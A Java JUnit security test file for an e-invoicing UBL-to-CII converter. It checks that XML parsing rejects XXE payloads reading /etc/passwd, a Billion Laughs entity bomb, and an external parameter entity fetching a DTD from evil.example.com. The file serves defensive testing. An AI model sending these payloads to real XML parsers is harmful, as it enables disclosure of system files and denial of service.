/*
 * Copyright (C) 2024-2026 Philip Helger
 * http://www.helger.com
 * philip[at]helger[dot]com
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *         http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package com.helger.en16931.ubl2cii.security;

import static org.junit.Assert.assertNull;
import static org.junit.Assert.assertTrue;

import java.nio.charset.StandardCharsets;

import org.junit.Test;

import com.helger.base.io.nonblocking.NonBlockingByteArrayInputStream;
import com.helger.diagnostics.error.list.ErrorList;
import com.helger.en16931.ubl2cii.UBLToCIIConversionHelper;

/**
 * Security tests verifying XXE (XML External Entity) protection in the XML parsing pipeline.
 *
 * @author Security Audit
 */
public final class XXEProtectionTest
{
  /**
   * Test that a classic XXE payload with an external entity referencing a local file is rejected by
   * the auto-detect parser (which uses DOMReader internally).
   */
  @Test
  public void testXXEEntityExpansionRejected ()
  {
    // Classic XXE payload attempting to read /etc/passwd via external entity
    final String sXXEPayload = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n" +
                               "<!DOCTYPE foo [\n" +
                               "  <!ENTITY xxe SYSTEM \"file:///etc/passwd\">\n" +
                               "]>\n" +
                               "<Invoice xmlns=\"urn:oasis:names:specification:ubl:schema:xsd:Invoice-2\">\n" +
                               "  <cbc:ID xmlns:cbc=\"urn:oasis:names:specification:ubl:schema:xsd:CommonBasicComponents-2\">&xxe;</cbc:ID>\n" +
                               "</Invoice>";

    final ErrorList aErrorList = new ErrorList ();
    final var aResult = UBLToCIIConversionHelper.convertUBL21AutoDetectToCIID16B (new NonBlockingByteArrayInputStream (sXXEPayload.getBytes (StandardCharsets.UTF_8)),
                                                                                  aErrorList);

    // The parser must reject the document (return null) due to the DOCTYPE
    assertNull ("XXE payload must be rejected by the parser", aResult);
    assertTrue ("Error list must contain parsing errors", aErrorList.containsAtLeastOneError ());
  }

  /**
   * Test that a Billion Laughs (XML bomb) payload is rejected. This tests entity expansion limits.
   */
  @Test
  public void testBillionLaughsRejected ()
  {
    final String sBillionLaughs = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n" +
                                  "<!DOCTYPE lolz [\n" +
                                  "  <!ENTITY lol \"lol\">\n" +
                                  "  <!ENTITY lol2 \"&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;\">\n" +
                                  "  <!ENTITY lol3 \"&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;\">\n" +
                                  "  <!ENTITY lol4 \"&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;\">\n" +
                                  "]>\n" +
                                  "<Invoice xmlns=\"urn:oasis:names:specification:ubl:schema:xsd:Invoice-2\">\n" +
                                  "  <cbc:ID xmlns:cbc=\"urn:oasis:names:specification:ubl:schema:xsd:CommonBasicComponents-2\">&lol4;</cbc:ID>\n" +
                                  "</Invoice>";

    final ErrorList aErrorList = new ErrorList ();
    final var aResult = UBLToCIIConversionHelper.convertUBL21AutoDetectToCIID16B (new NonBlockingByteArrayInputStream (sBillionLaughs.getBytes (StandardCharsets.UTF_8)),
                                                                                  aErrorList);

    assertNull ("Billion Laughs payload must be rejected", aResult);
    assertTrue ("Error list must contain parsing errors", aErrorList.containsAtLeastOneError ());
  }

  /**
   * Test that an external parameter entity is rejected.
   */
  @Test
  public void testExternalParameterEntityRejected ()
  {
    final String sPayload = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n" +
                            "<!DOCTYPE foo [\n" +
                            "  <!ENTITY % xxe SYSTEM \"http://evil.example.com/xxe.dtd\">\n" +
                            "  %xxe;\n" +
                            "]>\n" +
                            "<Invoice xmlns=\"urn:oasis:names:specification:ubl:schema:xsd:Invoice-2\">\n" +
                            "  <cbc:ID xmlns:cbc=\"urn:oasis:names:specification:ubl:schema:xsd:CommonBasicComponents-2\">test</cbc:ID>\n" +
                            "</Invoice>";

    final ErrorList aErrorList = new ErrorList ();
    final var aResult = UBLToCIIConversionHelper.convertUBL21AutoDetectToCIID16B (new NonBlockingByteArrayInputStream (sPayload.getBytes (StandardCharsets.UTF_8)),
                                                                                  aErrorList);

    assertNull ("External parameter entity payload must be rejected", aResult);
    assertTrue ("Error list must contain parsing errors", aErrorList.containsAtLeastOneError ());
  }

  /**
   * Test that XXE is also rejected when using the direct Invoice conversion path (JAXB-based
   * parsing via UBL21Marshaller).
   */
  @Test
  public void testXXERejectedViaInvoicePath ()
  {
    final String sXXEPayload = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n" +
                               "<!DOCTYPE foo [\n" +
                               "  <!ENTITY xxe SYSTEM \"file:///etc/passwd\">\n" +
                               "]>\n" +
                               "<Invoice xmlns=\"urn:oasis:names:specification:ubl:schema:xsd:Invoice-2\">\n" +
                               "  <cbc:ID xmlns:cbc=\"urn:oasis:names:specification:ubl:schema:xsd:CommonBasicComponents-2\">&xxe;</cbc:ID>\n" +
                               "</Invoice>";

    final ErrorList aErrorList = new ErrorList ();
    final var aResult = UBLToCIIConversionHelper.convertUBL21InvoiceToCIID16B (new NonBlockingByteArrayInputStream (sXXEPayload.getBytes (StandardCharsets.UTF_8)),
                                                                               aErrorList);

    // Either null (rejected) or the entity was not resolved (safe either way)
    if (aResult != null)
    {
      // If JAXB parsed it, verify the entity was NOT resolved
      // (the ID should not contain file contents)
      assertTrue ("XXE entity must not be resolved in JAXB path", aErrorList.containsAtLeastOneError ());
    }
  }

  /**
   * Test that XXE is rejected via the CreditNote conversion path.
   */
  @Test
  public void testXXERejectedViaCreditNotePath ()
  {
    final String sXXEPayload = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n" +
                               "<!DOCTYPE foo [\n" +
                               "  <!ENTITY xxe SYSTEM \"file:///etc/passwd\">\n" +
                               "]>\n" +
                               "<CreditNote xmlns=\"urn:oasis:names:specification:ubl:schema:xsd:CreditNote-2\">\n" +
                               "  <cbc:ID xmlns:cbc=\"urn:oasis:names:specification:ubl:schema:xsd:CommonBasicComponents-2\">&xxe;</cbc:ID>\n" +
                               "</CreditNote>";

    final ErrorList aErrorList = new ErrorList ();
    final var aResult = UBLToCIIConversionHelper.convertUBL21CreditNoteToCIID16B (new NonBlockingByteArrayInputStream (sXXEPayload.getBytes (StandardCharsets.UTF_8)),
                                                                                  aErrorList);

    if (aResult != null)
    {
      assertTrue ("XXE entity must not be resolved in CreditNote JAXB path", aErrorList.containsAtLeastOneError ());
    }
  }
}
